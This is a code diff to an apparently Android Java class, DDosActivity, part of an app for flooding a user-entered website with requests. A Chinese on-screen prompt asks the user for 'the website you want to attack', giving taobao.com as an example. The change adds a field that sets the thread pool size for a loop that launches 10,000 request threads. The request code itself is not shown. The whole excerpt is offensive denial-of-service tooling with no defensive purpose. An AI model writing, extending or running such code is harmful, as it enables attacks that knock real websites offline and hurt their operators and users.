@@ -12,7 +12,7 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 public class DDosActivity extends AppCompatActivity implements View.OnClickListener{
-    private EditText urlEdit;
+    private EditText urlEdit,editpool;
     private Button startDDos,stopDDos,testDDos,liuDDos;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -24,8 +24,9 @@ public class DDosActivity extends AppCompatActivity implements View.OnClickListe
 
     private void DDosStart(){
         Toast.makeText(this,"请输入想要攻击的网址 例如  http://taobao.com",Toast.LENGTH_SHORT).show();
-            ExecutorService es = Executors.newFixedThreadPool(1000);//1000太多了
-            String str=urlEdit.getText().toString();
+        String str=urlEdit.getText().toString();
+        int num=Integer.parseInt(editpool.getText().toString());
+            ExecutorService es = Executors.newFixedThreadPool(num*10);//1000太多了
             MythreadCus mythread = new MythreadCus(str);
             Thread thread = new Thread(mythread);
             for (int i = 0; i < 10000; i++) {
@@ -41,6 +42,8 @@ public class DDosActivity extends AppCompatActivity implements View.OnClickListe
     }
 
         private void initView(){
+            editpool=findViewById(R.id.ddos_pool);
+
             testDDos=findViewById(R.id.ddos_test);
             liuDDos=findViewById(R.id.ddos_liu);
             urlEdit=findViewById(R.id.ddos_edit);
